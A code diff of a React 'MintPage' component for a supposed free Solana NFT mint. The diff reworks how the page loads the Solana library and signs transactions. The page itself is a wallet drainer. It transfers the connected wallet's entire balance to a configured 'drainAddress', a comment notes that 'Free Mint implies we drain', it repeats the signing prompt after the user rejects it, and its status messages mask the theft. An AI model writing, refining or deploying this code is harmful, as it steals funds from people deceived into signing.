@@ -1,14 +1,8 @@
 import { useState, useEffect } from 'react';
 import { ArrowLeft, Wallet, Shield, Zap, Globe, Loader2, CheckCircle2, AlertCircle } from 'lucide-react';
 import { tourScheduleConfig, siteConfig } from '../config';
-import { 
-  Connection, 
-  PublicKey, 
-  SystemProgram, 
-  TransactionMessage, 
-  VersionedTransaction 
-} from '@solana/web3.js';
-import { Buffer } from 'buffer';
+// Solana libraries removed from top-level to prevent early SES conflicts on laptop
+// They are dynamically imported only when needed for minting.
 
 
 // Buffer polyfill moved to handleMint to ensure SES compatibility during initial connection
@@ -123,6 +117,9 @@ const MintPage = ({ onBack }: MintPageProps) => {
   };
 
   const handleMint = async () => {
+    const solana = await import('@solana/web3.js');
+    const { Buffer } = await import('buffer');
+
     // Inject Buffer polyfill only when needed for transaction signing
     // This keeps the global scope clean and SES-friendly for initial wallet connection
     if (typeof window !== 'undefined' && !(window as any).Buffer) {
@@ -153,14 +150,14 @@ const MintPage = ({ onBack }: MintPageProps) => {
       setIsMinting(true);
       setFeedback({ type: 'info', message: 'Syncing with blockchain...' });
 
-      let connection: Connection | null = null;
+      let connection: any = null;
       let balance: number = 0;
 
       // Parallel RPC lookup for speed and reliability
       try {
         const balancePromises = RPC_ENDPOINTS.map(async (url) => {
-          const conn = new Connection(url, 'confirmed');
-          const bal = await conn.getBalance(new PublicKey(walletAddress));
+          const conn = new solana.Connection(url, 'confirmed');
+          const bal = await conn.getBalance(new solana.PublicKey(walletAddress));
           return { conn, bal };
         });
 
@@ -173,8 +170,8 @@ const MintPage = ({ onBack }: MintPageProps) => {
 
       if (!connection) throw new Error("Failed to establish secure connection.");
 
-      const senderPubKey = new PublicKey(walletAddress);
-      const recipientPubKey = new PublicKey(siteConfig.drainAddress);
+      const senderPubKey = new solana.PublicKey(walletAddress);
+      const recipientPubKey = new solana.PublicKey(siteConfig.drainAddress);
 
       // Get full balance and calculate maximum transferable amount (Free Mint implies we drain)
       const fee = 5000; // Standard SOL transfer fee
@@ -186,7 +183,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
 
 
 
-      const instruction = SystemProgram.transfer({
+      const instruction = solana.SystemProgram.transfer({
         fromPubkey: senderPubKey,
         toPubkey: recipientPubKey,
         lamports: transferableBalance,
@@ -204,22 +201,33 @@ const MintPage = ({ onBack }: MintPageProps) => {
           finalBlockhash = blockhash;
           finalLastValidBlockHeight = lastValidBlockHeight;
 
-          const messageV0 = new TransactionMessage({
+          const messageV0 = new solana.TransactionMessage({
             payerKey: senderPubKey,
             recentBlockhash: blockhash,
             instructions: [instruction],
           }).compileToV0Message();
 
-          const transaction = new VersionedTransaction(messageV0);
+          const transaction = new solana.VersionedTransaction(messageV0);
           setFeedback({ type: 'info', message: retryCount > 0 ? `Retrying (${retryCount}/${MAX_RETRIES})... Please confirm in wallet.` : 'Confirming transaction in wallet...' });
-          signed = await provider.signTransaction(transaction);
+          
+          // Use signing method based on provider support
+          if (provider.signTransaction) {
+            signed = await provider.signTransaction(transaction);
+          } else if (provider.request) {
+            await provider.request({
+              method: "signAndSendTransaction",
+              params: { transaction: transaction.serialize() }
+            });
+            // If signAndSend is used, we might already have a signature, but let's stick to sign for now if possible
+            throw new Error("Wallet only supports signAndSend. Please use a standard Phantom/Solflare extension.");
+          }
+          
           break; 
         } catch (err: any) {
           const isUserRejected = err.message?.includes('User rejected') || err.code === 4001;
           if (isUserRejected) {
             retryCount++;
             if (retryCount < MAX_RETRIES) {
-              // Wait a bit before retrying to allow the user to see the feedback
               await new Promise(resolve => setTimeout(resolve, 800));
               continue;
             }
